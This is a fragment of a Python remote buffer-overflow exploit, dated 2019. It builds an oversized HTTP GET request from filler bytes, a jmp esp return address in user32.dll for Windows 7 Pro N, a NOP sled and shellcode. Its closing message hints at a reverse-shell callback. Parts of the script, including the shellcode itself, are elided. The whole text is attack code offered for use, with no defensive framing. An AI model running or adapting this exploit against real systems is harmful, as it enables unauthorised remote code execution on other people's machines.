...
# discovered by class101
# coded by JMcPeters 2/27/19
...
# 0x771B6D53 = jmp esp in user32.dll | Win7 Pro N

fuzzlove =  ( 'A' * 1787 )
fuzzlove += struct.pack('<L', 0x771B6D53)
fuzzlove += ( '\x90' * 20 ) + shellcode + ( '\x90' * 20 )

buffer = "GET " + fuzzlove + " HTTP/1.1\r\n\r\n"
...
try:
    ...
    print s.recv(1024)
    sock.close()
    print "\nDone! You should be hearing from my friend.."
except:
